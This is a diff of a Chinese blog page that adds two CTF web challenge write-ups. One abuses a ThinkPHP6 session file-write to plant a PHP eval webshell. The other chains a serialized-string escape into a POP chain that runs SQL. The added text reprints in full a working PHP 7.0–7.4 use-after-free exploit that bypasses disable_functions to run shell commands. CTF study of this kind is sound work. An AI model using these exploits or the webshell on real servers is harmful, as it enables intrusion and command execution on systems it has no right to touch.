@@ -9,7 +9,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
-<link rel="shortcut icon" href="https://guokeya.github.io/favicon.ico?v=1582522919509">
+<link rel="shortcut icon" href="https://guokeya.github.io/favicon.ico?v=1582640337124">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
 <link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
 
@@ -30,7 +30,7 @@
   <div class="top-container" data-aos="fade-right">
     <div class="top-header-container">
       <a class="site-title-container" href="https://guokeya.github.io">
-        <img src="https://guokeya.github.io/images/avatar.png?v=1582522919509" class="site-logo">
+        <img src="https://guokeya.github.io/images/avatar.png?v=1582640337124" class="site-logo">
         <h1 class="site-title">过客</h1>
       </a>
       <div class="menu-btn" @click="menuVisible = !menuVisible">
@@ -286,7 +286,338 @@ for i in range(100):
 </code></pre>
 <p>这里字符串比较。不区分大小写。<br>
 如果区分大小写。可以用binary具体检测。这题过滤了in。就不行了。<br>
-<img src="https://guokeya.github.io/post-images/1582521792220.png" alt="" loading="lazy"></p>
+<img src="https://guokeya.github.io/post-images/1582521792220.png" alt="" loading="lazy"><br>
+<strong>easy_thinking</strong><br>
+www.zip源码泄露<br>
+根据源码可知。这是个thinkphp6搭建的web。<br>
+<img src="https://guokeya.github.io/post-images/1582635970537.png" alt="" loading="lazy"><br>
+哎。一直没怎么学thinkphp😥<br>
+先百度下thinkphp6有啥洞<br>
+<code>https://paper.seebug.org/1114/</code><br>
+搜了下发现就一个反序列化和session任意文件写入。<br>
+<img src="https://guokeya.github.io/post-images/1582636167495.png" alt="" loading="lazy"><br>
+利用条件。需要session可控。并且能访问<br>
+首先登陆下web<br>
+<img src="https://guokeya.github.io/post-images/1582636294645.png" alt="" loading="lazy"><br>
+随便搜索个123。返回主页。有历史搜索纪录。<br>
+<img src="https://guokeya.github.io/post-images/1582636341872.png" alt="" loading="lazy"><br>
+并且。这里session可以访问<br>
+<img src="https://guokeya.github.io/post-images/1582636425249.png" alt="" loading="lazy"><br>
+结合上面的洞。我们将session替换为总长32位的xxxxx.php<br>
+然后搜索内容会以序列化后的字符串存储。<br>
+登陆时修改session。搜索<code>&lt;?php eval($_POST[a])?&gt;</code>。<br>
+就会在session目录下存在一个sess_xxxxxx.php<br>
+<img src="https://guokeya.github.io/post-images/1582636620721.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1582636670686.png" alt="" loading="lazy"><br>
+这就是我们的shell<br>
+<img src="https://guokeya.github.io/post-images/1582636732345.png" alt="" loading="lazy"><br>
+phpinfo()发现禁用了很多函数。照常得bypass disable_function<br>
+但是。用的比较多的LD_PRELOADbypass不行了。这里禁用了send_mail<br>
+<img src="https://guokeya.github.io/post-images/1582636926794.png" alt="" loading="lazy"><br>
+有很多bypass方法。这里使用其他一个</p>
+<pre><code>&lt;?php
+
+# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)
+#
+# Bug: https://bugs.php.net/bug.php?id=76047
+# debug_backtrace() returns a reference to a variable 
+# that has been destroyed, causing a UAF vulnerability.
+#
+# This exploit should work on all PHP 7.0-7.4 versions
+# released as of 30/01/2020.
+#
+# Author: https://github.com/mm0r1
+
+$cmd = $_GET['cmd'];
+pwn($cmd);
+
+function pwn($cmd) {
+    global $abc, $helper, $backtrace;
+
+    class Vuln {
+        public $a;
+        public function __destruct() { 
+            global $backtrace; 
+            unset($this-&gt;a);
+            $backtrace = (new Exception)-&gt;getTrace(); # ;)
+            if(!isset($backtrace[1]['args'])) { # PHP &gt;= 7.4
+                $backtrace = debug_backtrace();
+            }
+        }
+    }
+
+    class Helper {
+        public $a, $b, $c, $d;
+    }
+
+    function str2ptr(&amp;$str, $p = 0, $s = 8) {
+        $address = 0;
+        for($j = $s-1; $j &gt;= 0; $j--) {
+            $address &lt;&lt;= 8;
+            $address |= ord($str[$p+$j]);
+        }
+        return $address;
+    }
+
+    function ptr2str($ptr, $m = 8) {
+        $out = &quot;&quot;;
+        for ($i=0; $i &lt; $m; $i++) {
+            $out .= chr($ptr &amp; 0xff);
+            $ptr &gt;&gt;= 8;
+        }
+        return $out;
+    }
+
+    function write(&amp;$str, $p, $v, $n = 8) {
+        $i = 0;
+        for($i = 0; $i &lt; $n; $i++) {
+            $str[$p + $i] = chr($v &amp; 0xff);
+            $v &gt;&gt;= 8;
+        }
+    }
+
+    function leak($addr, $p = 0, $s = 8) {
+        global $abc, $helper;
+        write($abc, 0x68, $addr + $p - 0x10);
+        $leak = strlen($helper-&gt;a);
+        if($s != 8) { $leak %= 2 &lt;&lt; ($s * 8) - 1; }
+        return $leak;
+    }
+
+    function parse_elf($base) {
+        $e_type = leak($base, 0x10, 2);
+
+        $e_phoff = leak($base, 0x20);
+        $e_phentsize = leak($base, 0x36, 2);
+        $e_phnum = leak($base, 0x38, 2);
+
+        for($i = 0; $i &lt; $e_phnum; $i++) {
+            $header = $base + $e_phoff + $i * $e_phentsize;
+            $p_type  = leak($header, 0, 4);
+            $p_flags = leak($header, 4, 4);
+            $p_vaddr = leak($header, 0x10);
+            $p_memsz = leak($header, 0x28);
+
+            if($p_type == 1 &amp;&amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write
+                # handle pie
+                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
+                $data_size = $p_memsz;
+            } else if($p_type == 1 &amp;&amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec
+                $text_size = $p_memsz;
+            }
+        }
+
+        if(!$data_addr || !$text_size || !$data_size)
+            return false;
+
+        return [$data_addr, $text_size, $data_size];
+    }
+
+    function get_basic_funcs($base, $elf) {
+        list($data_addr, $text_size, $data_size) = $elf;
+        for($i = 0; $i &lt; $data_size / 8; $i++) {
+            $leak = leak($data_addr, $i * 8);
+            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {
+                $deref = leak($leak);
+                # 'constant' constant check
+                if($deref != 0x746e6174736e6f63)
+                    continue;
+            } else continue;
+
+            $leak = leak($data_addr, ($i + 4) * 8);
+            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {
+                $deref = leak($leak);
+                # 'bin2hex' constant check
+                if($deref != 0x786568326e6962)
+                    continue;
+            } else continue;
+
+            return $data_addr + $i * 8;
+        }
+    }
+
+    function get_binary_base($binary_leak) {
+        $base = 0;
+        $start = $binary_leak &amp; 0xfffffffffffff000;
+        for($i = 0; $i &lt; 0x1000; $i++) {
+            $addr = $start - 0x1000 * $i;
+            $leak = leak($addr, 0, 7);
+            if($leak == 0x10102464c457f) { # ELF header
+                return $addr;
+            }
+        }
+    }
+
+    function get_system($basic_funcs) {
+        $addr = $basic_funcs;
+        do {
+            $f_entry = leak($addr);
+            $f_name = leak($f_entry, 0, 6);
+
+            if($f_name == 0x6d6574737973) { # system
+                return leak($addr + 8);
+            }
+            $addr += 0x20;
+        } while($f_entry != 0);
+        return false;
+    }
+
+    function trigger_uaf($arg) {
+        # str_shuffle prevents opcache string interning
+        $arg = str_shuffle(str_repeat('A', 79));
+        $vuln = new Vuln();
+        $vuln-&gt;a = $arg;
+    }
+
+    if(stristr(PHP_OS, 'WIN')) {
+        die('This PoC is for *nix systems only.');
+    }
+
+    $n_alloc = 10; # increase this value if UAF fails
+    $contiguous = [];
+    for($i = 0; $i &lt; $n_alloc; $i++)
+        $contiguous[] = str_shuffle(str_repeat('A', 79));
+
+    trigger_uaf('x');
+    $abc = $backtrace[1]['args'][0];
+
+    $helper = new Helper;
+    $helper-&gt;b = function ($x) { };
+
+    if(strlen($abc) == 79 || strlen($abc) == 0) {
+        die(&quot;UAF failed&quot;);
+    }
+
+    # leaks
+    $closure_handlers = str2ptr($abc, 0);
+    $php_heap = str2ptr($abc, 0x58);
+    $abc_addr = $php_heap - 0xc8;
+
+    # fake value
+    write($abc, 0x60, 2);
+    write($abc, 0x70, 6);
+
+    # fake reference
+    write($abc, 0x10, $abc_addr + 0x60);
+    write($abc, 0x18, 0xa);
+
+    $closure_obj = str2ptr($abc, 0x20);
+
+    $binary_leak = leak($closure_handlers, 8);
+    if(!($base = get_binary_base($binary_leak))) {
+        die(&quot;Couldn't determine binary base address&quot;);
+    }
+
+    if(!($elf = parse_elf($base))) {
+        die(&quot;Couldn't parse ELF header&quot;);
+    }
+
+    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
+        die(&quot;Couldn't get basic_functions address&quot;);
+    }
+
+    if(!($zif_system = get_system($basic_funcs))) {
+        die(&quot;Couldn't get zif_system address&quot;);
+    }
+
+    # fake closure object
+    $fake_obj_offset = 0xd0;
+    for($i = 0; $i &lt; 0x110; $i += 8) {
+        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
+    }
+
+    # pwn
+    write($abc, 0x20, $abc_addr + $fake_obj_offset);
+    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
+    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler
+
+    ($helper-&gt;b)($cmd);
+    exit();
+}
+</code></pre>
+<p>支持PHP7.0-7.4<br>
+用蚁键上传后。直接访问就行<br>
+<img src="https://guokeya.github.io/post-images/1582637136613.png" alt="" loading="lazy"><br>
+<strong>babyphp</strong><br>
+www.zip源码泄露<br>
+首先看idnex.php<br>
+<img src="https://guokeya.github.io/post-images/1582637303312.png" alt="" loading="lazy"><br>
+代码很简洁。文件包含action参数+.php<br>
+判断是否登陆。登陆就调转update.php<br>
+OK。继续看login.php<br>
+<img src="https://guokeya.github.io/post-images/1582637440869.png" alt="" loading="lazy"><br>
+过滤了很多函数。接着会调用lib.php中User类的login函数。</p>
+<pre><code>    public function login() {
+        if(isset($_POST['username'])&amp;&amp;isset($_POST['password'])){
+        $mysqli=new dbCtrl();
+        $this-&gt;id=$mysqli-&gt;login('select id,password from user where username=?');
+        if($this-&gt;id){
+        $_SESSION['id']=$this-&gt;id;  
+        $_SESSION['login']=1;
+        echo &quot;你的ID是&quot;.$_SESSION['id'];
+        echo &quot;你好！&quot;.$_SESSION['token'];
+        echo &quot;&lt;script&gt;window.location.href='./update.php'&lt;/script&gt;&quot;;
+        return $this-&gt;id;
+        }
+    }
+</code></pre>
+<p>可以看到。login函数。又会调用dbCtrl类中的login函数。并且带一个sql语句<br>
+继续追踪<br>
+<img src="https://guokeya.github.io/post-images/1582637581038.png" alt="" loading="lazy"><br>
+这里sql语句。将使用预处理。然后执行。返回id<br>
+使用了预处理。那么基本注入没了。除非数据库使用utf-8<br>
+接下来看update.php<br>
+<img src="https://guokeya.github.io/post-images/1582637723680.png" alt="" loading="lazy"><br>
+只要<code>session['login']=1</code>就会输出flag。并且update.php未登陆时只是echo 你还没有登陆。并没有exit退出。下面的语句会继续执行<br>
+调用user类的update函数。<br>
+将POST的age和nickname带入Info类。然后序列化。经过safe函数。替换。再反序列化</p>
+<pre><code>function safe($parm){
+    $array= array('union','regexp','load','into','flag','file','insert',&quot;'&quot;,'\\',&quot;*&quot;,&quot;alter&quot;);
+    return str_replace($array,'hacker',$parm);
+}
+</code></pre>
+<p>之前我做题有遇到过序列化字符串。经过替换。实现字符逃逸的。博客中有题解<br>
+那么这不就有了。逃逸+反序列化字符串可控+构造POP链执行sql语句<br>
+之前只做到了逃逸字符串。对于逃逸对象。实在是第一次遇见。也怪我想得太少。没想过能逃逸对象<br>
+逃逸字符串原理就不讲了。<br>
+<img src="https://guokeya.github.io/post-images/1582638132555.png" alt="" loading="lazy"><br>
+我们要做的就是逃逸对象给CtrlCase。然后执行反序列化。<br>
+下面构造POP链<br>
+<img src="https://guokeya.github.io/post-images/1582638210005.png" alt="" loading="lazy"><br>
+程序调用UpdateHelper类的时候。会在执行完触发__destruct函数。执行echo $this-&gt;sql<br>
+而反序列化可以更改sql的值。将sql赋值为其他类。就可以触发tostring魔法函数<br>
+<img src="https://guokeya.github.io/post-images/1582638347646.png" alt="" loading="lazy"></p>
+<pre><code>User类调用UpdateHelper类
+UpdateHelper执行完触发__destruct。echo $this-&gt;sql
+将$this-&gt;sql赋值为User类。就会触发__toString魔法函数
+调用$this-&gt;nickname-&gt;update($this-&gt;age)
+$this-&gt;nickname为Info。调用update函数。由于不存在此函数。就会触发__call魔法函数
+调用$this-&gt;CtrlCase-&gt;login($argument[0])
+$this-&gt;CtrlCase为dbCtrl类。那么就会执行dbCtrl类的login函数。将参数作为sql语句执行
+</code></pre>
+<p><code>这里call魔法函数。$name的值是想要调用函数名的值。带的参数是$argument</code><br>
+比如我调用xxx类的abc函数。而xxx类并没有这个函数。触发__call函数。那么name就是你想要调用函数的名字。argument才是真正的参数<br>
+<img src="https://guokeya.github.io/post-images/1582638805260.png" alt="" loading="lazy"></p>
+<pre><code>接下来追踪下sql语句。通过User类的$this-&gt;age传递。那么将age设为sql语句即可
+由于执行完会返回两个结果。绑定id和password。那么我们就写
+select password,id from user where username='admin'
+返回的第一个时password。赋值给id
+而id又会输出。我们拿到password解密登陆就行了
+</code></pre>
+<p>以下是我的payload<br>
+<img src="https://guokeya.github.io/post-images/1582639043125.png" alt="" loading="lazy"><br>
+先本地测试下。<br>
+<img src="https://guokeya.github.io/post-images/1582639256270.png" alt="" loading="lazy"><br>
+因为我们是覆盖最后一个Ctrlcase。而我们输入又在此前<br>
+所以。我们直接自己构造。&quot;闭合前面<br>
+<code>;s:8:&quot;CtrlCase&quot;;</code>表示CtrlCase开始后面跟我们构造的object对象<br>
+最后还得加上<code>}</code>表示整个序列化字符串结尾。<br>
+总共222个字符。根据替换。*替换hacker。一次可以多5个字符。union替换。一次多1个字符。<br>
+<code>*x44+unionx2=222</code><br>
+<img src="https://guokeya.github.io/post-images/1582640275345.png" alt="" loading="lazy"><br>
+将这串md5解密。得到yingyingying<br>
+admin，yingyingying登陆拿flag<br>
+<img src="https://guokeya.github.io/post-images/1582640333234.png" alt="" loading="lazy"></p>
 
             </div>
             
